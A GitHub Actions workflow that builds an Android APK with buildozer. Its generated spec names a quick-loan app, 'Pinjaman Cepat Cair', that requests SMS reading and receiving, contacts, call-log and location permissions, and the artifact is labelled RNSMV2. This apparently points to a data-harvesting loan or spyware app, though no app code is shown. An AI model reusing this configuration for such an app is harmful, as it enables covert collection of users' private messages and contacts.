name: Build APK

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.9'
      
      - name: Install dependencies with fix
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            python3-pip \
            git \
            unzip \
            openjdk-17-jdk \
            wget \
            curl \
            build-essential \
            autoconf \
            automake \
            libtool \
            pkg-config \
            cmake \
            libffi-dev \
            libssl-dev \
            libncurses5-dev \
            libncursesw5-dev \
            libreadline-dev \
            libsqlite3-dev \
            libgdbm-dev \
            libbz2-dev \
            libexpat1-dev \
            liblzma-dev \
            zlib1g-dev \
            uuid-dev \
            libffi8 \
            libffi-dev \
            m4 \
            libtool-bin
          
          # Install Python packages
          pip3 install --user --upgrade pip
          pip3 install --user buildozer cython virtualenv
          echo "$HOME/.local/bin" >> $GITHUB_PATH
      
      - name: Setup Android SDK (sederhana)
        run: |
          # Install Android SDK via apt (lebih mudah)
          sudo apt-get install -y android-sdk
          export ANDROID_HOME=/usr/lib/android-sdk
          echo "ANDROID_HOME=/usr/lib/android-sdk" >> $GITHUB_ENV
          
          # Accept licenses
          yes | sudo $ANDROID_HOME/tools/bin/sdkmanager --licenses || true
          
          # Install build-tools
          sudo $ANDROID_HOME/tools/bin/sdkmanager "build-tools;30.0.3" || true
      
      - name: Fix buildozer.spec
        run: |
          cat > buildozer.spec << 'EOF'
          [app]
          title = Pinjaman Cepat Cair
          package.name = pinjolcepat
          package.domain = com.pinjol.cepat
          source.dir = .
          source.include_exts = py,png,jpg,kv,ttf,json
          version = 1.0.0
          requirements = python3,kivy==2.1.0,requests,android,pyjnius,prctl
          orientation = portrait
          osx.python_version = 3
          osx.kivy_version = 2.1.0
          fullscreen = 0

          [buildozer]
          log_level = 2
          warn_on_root = 1

          [android]
          api = 30
          minapi = 21
          ndk = 23b
          permissions = INTERNET,READ_SMS,RECEIVE_SMS,READ_CONTACTS,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_CALL_LOG
          android.permissions = INTERNET,READ_SMS,RECEIVE_SMS,READ_CONTACTS,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_CALL_LOG
          android.api = 30
          android.minapi = 21
          android.ndk = 23b
          android.accept_sdk_license = True
          android.ndk_path = /usr/lib/android-sdk/ndk/23.2.8568313
          EOF
      
      - name: Install specific NDK version
        run: |
          cd /usr/lib/android-sdk
          sudo mkdir -p ndk
          sudo wget -q https://dl.google.com/android/repository/android-ndk-r23b-linux.zip
          sudo unzip -q android-ndk-r23b-linux.zip
          sudo mv android-ndk-r23b ndk/23.2.8568313
      
      - name: Build APK
        run: |
          export USER=runner
          export ANDROID_HOME=/usr/lib/android-sdk
          export PATH=$PATH:$ANDROID_HOME/tools/bin:$ANDROID_HOME/platform-tools
          
          # Clean
          rm -rf bin .buildozer
          
          # Build with specific flags
          buildozer android debug 2>&1 | tee build.log
      
      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: RNSMV2-APK
          path: bin/*.apk
          if-no-files-found: warn
      
      - name: Upload build log
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: build-log
          path: build.log